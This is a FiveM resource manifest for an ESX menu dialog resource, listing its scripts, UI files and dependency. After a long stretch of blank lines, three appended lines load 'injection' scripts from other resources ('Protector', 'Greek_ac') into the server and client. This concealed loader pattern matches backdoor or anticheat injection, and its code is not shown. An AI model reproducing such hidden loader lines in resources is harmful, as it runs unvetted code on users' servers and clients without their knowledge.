resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Menu Dialog'

version '1.1.0'

client_script 'client/main.lua'

ui_page 'html/ui.html'

files {
	'html/ui.html',
	'html/texture.png',

	'html/css/app.css',

	'html/js/mustache.min.js',
	'html/js/app.js',

	'html/fonts/*.ttf',
}

dependency 'es_extended'

















server_script "@Protector/Server/injection.lua"
client_script "@Greek_ac/client/injections.lua"
server_script "@Greek_ac/server/injections.lua"